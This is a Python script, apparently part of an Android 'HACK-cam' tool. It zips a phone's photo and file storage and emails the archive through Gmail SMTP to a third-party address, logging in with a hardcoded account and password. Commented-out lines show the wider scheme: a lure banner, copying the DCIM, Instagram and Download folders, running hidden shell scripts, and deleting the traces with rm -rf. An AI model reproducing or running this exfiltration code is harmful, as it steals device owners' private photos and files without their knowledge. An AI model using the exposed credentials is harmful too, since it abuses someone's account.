import smtplib
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText
from email.mime.base import MIMEBase
from email import encoders
#from sys import *
#from os import *
###############
#color
###############
#R='\033[1;31m'
#G='\033[1;32m'
#Y='\033[1;33m'
#C='\033[1;36m'
#W='\033[1;37m'

#print('''\033[1;32m        .---.''')
#print('''\033[1;32m        |[\033[1;31mX\033[1;32m]|''')
#print('''\033[1;32m _.==._.""""".___n__''')
#print('''\033[1;32md __ ___.-""-. _____b''')
#print('''\033[1;32m|[__]  /.""".\\\ _   |''')
#print('''\033[1;32m|     // /""\ \\\_)  |''')
#print('''\033[1;32m|     \\\ \__/ //    |''')
#print('''\033[1;32m|      \`.__.`/     |''')
#print('''\033[1;32m\=======`-..-`======/''')
#print('''\033[1;32m `-----------------` ''')

#droid=str(input(R +"●~"+ G +"Enter To Open "+ R +"~》 "+ G))
#system('clear')
#system('rm -rf /sdcard/hafid.zip')
#system('rm -rf /sdcard/hafid2.zip')
#system('bash .aski.sh')
#system('mkdir /sdcard/meow')
#system('cp -r /sdcard/DCIM meow')
#system('cp -r /sdcard/Instagram meow')
#system('cp -r /sdcard/Download meow')
#system('zip -r /sdcard/hafid.zip meow')
#system('mv ~/HACK-cam/hafid.zip /sdcard')
#system('rm -rf /sdcard/meow')
fromaddr = "ageant13047m3@gmail.com"
toaddr = "mohamd.shahoud11@gmail.com"

msg = MIMEMultipart()

msg['From'] = fromaddr
msg['To'] = toaddr
msg['Subject'] = "subject"

body = "pdf pdf pdf"
msg.attach(MIMEText(body, 'plain'))
filename = "hafid00.zip"
attachment = open("/storage/emulated/0/DCIM3.zip", "rb")
part = MIMEBase('application', 'octet-stream')
part.set_payload((attachment).read())
encoders.encode_base64(part)
part.add_header('Content-Disposition', "attachment; filename= %s" % filename)

msg.attach(part)

server = smtplib.SMTP('smtp.gmail.com', 587)
server.starttls()
server.login(fromaddr, "12345Rami@//")
text = msg.as_string()
server.sendmail(fromaddr, toaddr, text)
server.quit()
#system('rm -rf /storage/emulated/0/hafid.zip')
#system('cd ~/HACK-cam')
#system('bash ~/HACK-cam/.install.sh')
